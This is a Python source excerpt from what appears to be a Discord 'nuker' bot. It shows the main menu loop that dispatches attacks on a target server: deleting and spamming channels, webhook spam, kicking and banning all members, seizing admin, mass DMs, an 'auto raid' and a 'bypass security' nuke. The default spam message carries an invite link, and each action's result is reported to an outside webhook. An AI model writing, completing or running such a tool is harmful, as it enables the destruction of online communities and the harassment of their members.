    from mzkonuker.config import BOT_PRESENCE
    presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
    await bot.change_presence(activity=Activity(type=presence_type, name=BOT_PRESENCE["text"]))

    await asyncio.sleep(2)


    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        choice = input((Colorate.Color(Colors.red, """
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⣿⣷⠀⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠉⠉⠉⠉⠉⠉⠙⠛⠻⢿⣷⡀⠀⠀⠀⠀⠀
       ⠀⠀⢿⣿⠀⢹⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠈⠙⠄⠀⠀⠀
      ⠀⠀⠸⣿⡇      ______     ______     __  __     __    
      /\___  \   /\  __ \   /\  == \   /\ \/ /    /\ \  
      \/_/  /__  \ \ \/\ \  \ \  __<   \ \  _"-.  \ \ \  
        /\_____\  \ \_____\  \ \_\ \_\  \ \_\ \_\  \ \_\ 
        \/_____/   \/_____/   \/_/ /_/   \/_/\/_/   \/_/  
     ⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╭══════════════════════════════╮
     ⠀⠀⠀⠀⠀  ⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |            v1.0             |
        ⠀⠀ ⣀⣠⣴⡿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀|════════════════════════════|
        ⠀⠀⠈⠛⠛⠉⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀|  Mzko/Zorki |   KNMKILLAS |⠀
    ⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|        xender_123         |
    ⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠙⠻⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╰═══════════════════════════╯
    ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
                    
    ╭══════════════════════════════╮╭══════════════════════════════╮╭══════════════════════════════╮
    │      1 - Delete Channel      ││      2 - Create Channels     ││       3 - Spam Channels      │
    ╞══════════════════════════════╡╞══════════════════════════════╡╞══════════════════════════════╡
    │        4 - Webhook Spam      ││         5 - Kick All         ││          6 - Ban All         │
    ╞══════════════════════════════╡╞══════════════════════════════╡╞══════════════════════════════╡
    │        7 - Create Roles      ││         8 - Get Admin        ││       9 - Change Server      │
    ╰══════════════════════════════╯╰══════════════════════════════╯╰══════════════════════════════╯
    ╭──────────────────────────────╮╭──────────────────────────────╮╭──────────────────────────────╮
    │          10 - DM All         |│        11 - Auto Raid        │|  13 - Bypass security (nuke) |    
    ╰──────────────────────────────╯╰──────────────────────────────╯╰──────────────────────────────╯
               ╭──────────────────────────────────────────────────────────────╮
               │                        12 - SPR NUKER                        │
               ╰──────────────────────────────────────────────────────────────╯



    Choice :  """)))

        if choice == '1':
            try:
                await nuke(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "nuke", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "nuke", server_id)
                print(e)

        elif choice == '2':
            try:
                await create_channels(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "create_channels", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "create_channels", server_id)
                print(e)

        elif choice == '3':
            try:
                await spam_channel(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "spam_channel", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "spam_channel", server_id)
                print(e)

        elif choice == '4':
            try:
                await webhook_spam(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "webhook_spam", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "webhook_spam", server_id)
                print(e)

        elif choice == '5':
            try:
                await kick_all(server_id, bot.user.id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "kick_all", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "kick_all", server_id)
                print(e)

        elif choice == '6':
            try:
                await ban_all(server_id, bot.user.id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "ban_all", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "ban_all", server_id)
                print(e)

        elif choice == '7':
            try:
                await create_role(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "create_role", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "create_role", server_id)
                print(e)

        elif choice == '8':
            try:
                await get_admin(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "get_admin", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "get_admin", server_id)
                print(e)

        elif choice == '9':
            try:
                await change_server(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "change_server", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "change_server", server_id)
                print(e)

        elif choice == '10':
            try:
                await dm_all(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "dm_all", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "dm_all", server_id)
                print(e)

        elif choice == '11':
            try:
                await auto_raid(server_id)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "auto_raid", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "auto_raid", server_id)
                print(e)

        elif choice == '12':
            try:
                new_guild_name = SERVER_CONFIG["new_name"]
                num_channels = int(input("How many channels to create? "))
                channel_name = input("Enter name for new channels: ")
                message_content = input("Enter spam message (leave blank for default): ").strip()
                if not message_content:
                    message_content = "@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:"
                include_everyone_input = input("Tag @everyone in messages? (y/n): ").lower()
                include_everyone = include_everyone_input == 'y'

                await super_nuke(
                    server_id=server_id,
                    bot_user_id=bot.user.id,
                    new_guild_name=new_guild_name,
                    num_channels=num_channels,
                    channel_name=channel_name,
                    message_content=message_content,
                    include_everyone=include_everyone
                )
                log_to_webhook(str(bot.user), bot.user.id, "Success", "super_nuke", server_id)

            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "super_nuke", server_id)
                print(Colorate.Color(Colors.red, f"[!] Error: {e}"))

        elif choice == '13':
            try:
                new_name = input("Enter the new name for all channels: ")
                new_guild_name = input("Enter the new name for the server: ")
                await rename_and_botspam_all_channels(bot, int(server_id), new_name, new_guild_name)
                log_to_webhook(str(bot.user), bot.user.id, "Success", "rename_and_botspam_all_channels", server_id)
            except Exception as e:
                log_to_webhook(str(bot.user), bot.user.id, "Failed", "rename_and_botspam_all_channels", server_id)
                print(e)

        else:
            print((Colorate.Color(Colors.red, "[-] Invalid choice")))

        time.sleep(2)

if __name__ == "__main__":
    bot.run(bot_token)
